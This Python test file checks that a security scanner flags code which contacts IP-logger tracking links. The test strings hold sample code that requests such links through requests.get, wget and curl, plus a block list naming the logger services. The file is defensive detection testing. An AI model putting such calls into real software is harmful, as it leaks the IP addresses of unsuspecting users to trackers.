"""A link that logs the address of whoever opens it, handed to a call (`flows/implants/ip_logger.py`).

Every host is assembled here from pieces and only parsed: nothing is contacted."""

from __future__ import annotations

from cordon_scanner.analysis.python.pyast import PythonAnalyzer

LOGGER = "grab" + "ify.link"
OTHER = "iplog" + "ger.org"


class Kit:
    @staticmethod
    def fetched(source: str) -> list[str]:
        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail == "ip logger fetched"]


class TestALinkHandedToACall:
    def test_a_request_to_the_link(self) -> None:
        source = f"import requests\ndef go():\n    requests.get('https://{LOGGER}/ab12')\n"
        assert Kit.fetched(source) == ["ip logger fetched"]

    def test_a_download_command_run_on_the_link(self) -> None:
        source = (
            "import subprocess\n"
            "def separate(path):\n"
            f"    subprocess.Popen(['wget', '-q', 'https://{OTHER}/xyz', '-O', path])\n"
        )
        assert Kit.fetched(source) == ["ip logger fetched"]

    def test_the_link_held_in_a_name_first(self) -> None:
        source = (
            "import os\n"
            f"URL = 'https://{LOGGER}/q'\n"
            "def go():\n"
            "    os.system('curl ' + URL)\n"
        )
        assert Kit.fetched(source) == ["ip logger fetched"]


class TestAHostThatIsOnlyNamed:
    def test_a_list_of_services_a_linter_flags(self) -> None:
        source = f"BLOCKED = ['{LOGGER}', '{OTHER}']\ndef is_blocked(host):\n    return host in BLOCKED\n"
        assert Kit.fetched(source) == []

    def test_a_message_that_names_one(self) -> None:
        source = f"def warn():\n    print('do not open {LOGGER} links')\n"
        assert Kit.fetched(source) == []

    def test_an_ordinary_host(self) -> None:
        source = "import requests\nrequests.get('https://docs.python.org/3/')\n"
        assert Kit.fetched(source) == []
